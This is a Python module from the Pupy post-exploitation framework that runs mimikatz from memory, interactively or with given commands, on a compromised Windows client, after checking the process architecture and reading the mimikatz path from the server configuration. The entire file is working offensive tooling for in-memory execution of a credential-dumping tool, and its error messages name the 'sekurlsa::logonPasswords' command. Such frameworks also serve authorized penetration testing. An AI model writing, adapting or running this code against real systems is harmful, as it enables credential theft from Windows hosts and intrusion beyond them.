# -*- coding: utf-8 -*-
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms

from pupylib.PupyModule import (
    config, PupyArgumentParser,
    REQUIRE_TERMINAL
)

from modules.memory_exec import MemoryExec
from modules.lib.windows.memory_exec import exec_pe

import os.path

__class_name__="Mimishell"

@config(cat="exploit", compat="windows")
class Mimishell(MemoryExec):
    """
        execute mimikatz from memory (interactive)
    """

    dependencies = [
        'pupymemexec',
        'pupwinutils.memexec',
    ]

    io = REQUIRE_TERMINAL

    @classmethod
    def init_argparse(cls):
        cls.arg_parser = PupyArgumentParser(prog="mimikatz", description=cls.__doc__)
        cls.arg_parser.add_argument(
            'args', nargs='*', help='run mimikatz commands from argv (let empty to open mimikatz interactively)')

    def run(self, args):

        proc_arch       = self.client.desc["proc_arch"]
        mimikatz_path   = None

        if '64' in  self.client.desc['os_arch'] and "32" in proc_arch:
            self.error("You are in a x86 process right now. You have to be in a x64 process for running Mimikatz.")
            self.error("Otherwise, the following Mimikatz error will occur after 'sekurlsa::logonPasswords':")
            self.error("'ERROR kuhl_m_sekurlsa_acquireLSA ; mimikatz x86 cannot access x64 process'")
            self.error("Mimikatz has not been executed on the target")
            return

        if "64" in proc_arch:
            mimikatz_path = self.client.pupsrv.config.get("mimikatz","exe_x64")
        else:
            mimikatz_path = self.client.pupsrv.config.get("mimikatz","exe_Win32")

        if not os.path.isfile(mimikatz_path):
            self.error("Mimikatz exe %s not found ! please edit Mimikatz section in pupy.conf"%mimikatz_path)
            return

        mimikatz_args = args.args
        exec_pe(self, mimikatz_args, path=mimikatz_path, interactive=True)
